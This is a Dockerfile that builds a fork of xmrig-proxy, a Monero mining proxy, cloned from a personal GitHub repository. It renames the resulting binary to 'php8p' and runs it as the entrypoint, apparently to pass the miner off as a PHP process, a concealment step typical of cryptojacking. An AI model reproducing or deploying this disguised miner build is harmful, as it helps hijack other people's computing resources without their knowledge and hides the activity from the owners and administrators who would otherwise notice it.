FROM ubuntu:16.04

WORKDIR /app

RUN apt-get update
RUN apt-get install -y git build-essential cmake libuv1-dev uuid-dev libmicrohttpd-dev libssl-dev
RUN git clone https://github.com/bdklz/xmrig-proxy.git /app
RUN mkdir /app/build
RUN cmake .
RUN make
RUN mv xmrig-proxy php8p

ENTRYPOINT  ["./php8p"]
